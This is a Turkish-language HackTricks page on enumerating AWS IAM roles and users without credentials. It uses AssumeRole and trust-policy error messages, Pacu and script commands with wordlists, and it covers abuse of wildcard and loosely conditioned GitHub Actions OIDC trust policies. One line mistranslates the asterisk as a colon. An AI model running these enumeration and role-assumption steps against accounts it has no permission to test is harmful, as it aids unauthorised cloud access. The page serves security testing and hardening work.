# AWS - IAM ve STS Yetkilendirilmemiş Enum

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## Bir hesapta Rolleri ve Kullanıcı Adlarını Sıralama

### ~~Rolü Zorla Kullanma~~

{% hint style="danger" %}
**Bu teknik artık çalışmıyor** çünkü rol var veya yok, her zaman bu hatayı alırsınız:

`An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::947247140022:user/testenv is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::429217632764:role/account-balanceasdas`

Bunu **çalıştırarak** test edebilirsiniz:

`aws sts assume-role --role-arn arn:aws:iam::412345678909:role/superadmin --role-session-name s3-access-example`
{% endhint %}

**Gerekli izinlere sahip olmadan bir rolü kullanmaya çalışmak**, AWS'de bir hata mesajı tetikler. Örneğin, yetkisiz ise, AWS şunu döndürebilir:
```ruby
An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::012345678901:user/MyUser is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::111111111111:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS
```
Bu mesaj, rolün var olduğunu doğrular, ancak assume role politikasının senin assumption yapmana izin vermediğini belirtir. Buna karşılık, **var olmayan bir rolü assume etmeye çalışmak farklı bir hata ile sonuçlanır**:
```less
An error occurred (AccessDenied) when calling the AssumeRole operation: Not authorized to perform sts:AssumeRole
```
İlginç bir şekilde, mevcut ve mevcut olmayan roller arasındaki ayrımı belirleme yöntemi, farklı AWS hesapları arasında bile uygulanabilir. Geçerli bir AWS hesap kimliği ve hedeflenen bir kelime listesi ile hesapta bulunan rolleri sınırsız bir şekilde sıralayabilirsiniz.

Bu sorunu istismar etmek için [bu betiği kullanabilirsiniz](https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/assume\_role\_enum) potansiyel yetkilileri sıralamak için.

### Güven Politikaları: Cross Account rolleri ve kullanıcıları Brute-Force etmek

Bir IAM rolünün güven politikasını yapılandırmak veya güncellemek, o rolü almak ve geçici kimlik bilgilerini elde etmek için hangi AWS kaynaklarının veya hizmetlerin izin verildiğini tanımlamayı içerir. Belirtilen kaynak politikada **varsa**, güven politikası **başarıyla** kaydedilir. Ancak, kaynak **mevcut değilse**, geçersiz bir yetkilendirme sağlandığına dair bir hata oluşur.

{% hint style="warning" %}
Bu kaynakta bir cross account rolü veya kullanıcıyı belirtebilirsiniz:

* `arn:aws:iam::acc_id:role/role_name`
* `arn:aws:iam::acc_id:user/user_name`
{% endhint %}

İşte bir politika örneği:
```json
{
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":
{
"AWS":"arn:aws:iam::216825089941:role\/Test"
},
"Action":"sts:AssumeRole"
}
]
}
```
#### GUI

Bu, **var olmayan bir rol** kullandığınızda karşılaşacağınız **hata**dır. Rol **varsa**, politika **hata olmadan** kaydedilecektir. (Hata güncelleme için olsa da, oluştururken de çalışır)

![](<../../../.gitbook/assets/image (68).png>)

#### CLI
```bash
### You could also use: aws iam update-assume-role-policy
# When it works
aws iam create-role --role-name Test-Role --assume-role-policy-document file://a.json
{
"Role": {
"Path": "/",
"RoleName": "Test-Role",
"RoleId": "AROA5ZDCUJS3DVEIYOB73",
"Arn": "arn:aws:iam::947247140022:role/Test-Role",
"CreateDate": "2022-05-03T20:50:04Z",
"AssumeRolePolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::316584767888:role/account-balance"
},
"Action": [
"sts:AssumeRole"
]
}
]
}
}
}

# When it doesn't work
aws iam create-role --role-name Test-Role2 --assume-role-policy-document file://a.json
An error occurred (MalformedPolicyDocument) when calling the CreateRole operation: Invalid principal in policy: "AWS":"arn:aws:iam::316584767888:role/account-balanceefd23f2"
```
Bu süreci [https://github.com/carlospolop/aws\_tools](https://github.com/carlospolop/aws\_tools) ile otomatikleştirebilirsiniz.

* `bash unauth_iam.sh -t user -i 316584767888 -r TestRole -w ./unauth_wordlist.txt`

Veya [Pacu](https://github.com/RhinoSecurityLabs/pacu) kullanarak:

* `run iam__enum_users --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* `run iam__enum_roles --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* Örnekte kullanılan `admin` rolü, pacu tarafından taklit edilmek için hesabınızda **bir rol** olup, numaralandırma için oluşturması gereken politikaları oluşturmak için kullanılır.

### Privilege Escalation

Eğer rol yanlış yapılandırılmış ve herhangi bir kişinin bunu üstlenebilmesine izin veriyorsa:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "sts:AssumeRole"
}
]
}
```
Saldırgan sadece varsayabilir.

## Üçüncü Taraf OIDC Federasyonu

Bir **Github Actions iş akışı**nı okumayı başardığınızı düşünün, bu iş akışı bir **AWS** içindeki bir **rol**e erişiyor.\
Bu güven, aşağıdaki **güven politikasına** sahip bir role erişim sağlayabilir:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"Federated": "arn:aws:iam::<acc_id>:oidc-provider/token.actions.githubusercontent.com"
},
"Action": "sts:AssumeRoleWithWebIdentity",
"Condition": {
"StringEquals": {
"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
}
}
}
]
}
```
Bu güven politikası doğru olabilir, ancak **daha fazla koşulun eksikliği** size güvenmemeniz gerektiğini gösterir.\
Bu, önceki rolün **Github Actions'dan HERHANGİ BİRİ tarafından** alınabileceği anlamına gelir! Koşullarda ayrıca org adı, repo adı, env, branch gibi diğer şeyleri de belirtmelisiniz...

Başka bir potansiyel yanlış yapılandırma ise aşağıdaki gibi bir koşul **eklemektir**:
```json
"StringLike": {
"token.actions.githubusercontent.com:sub": "repo:org_name*:*"
}
```
Not: **iki nokta üst üste** (\*) ile **iki nokta** (:)'dan önce. **org\_name1** gibi bir org oluşturabilir ve Github Action'dan **rolü assume** edebilirsiniz.

## Referanslar

* [https://www.youtube.com/watch?v=8ZXRw4Ry3mQ](https://www.youtube.com/watch?v=8ZXRw4Ry3mQ)
* [https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/](https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
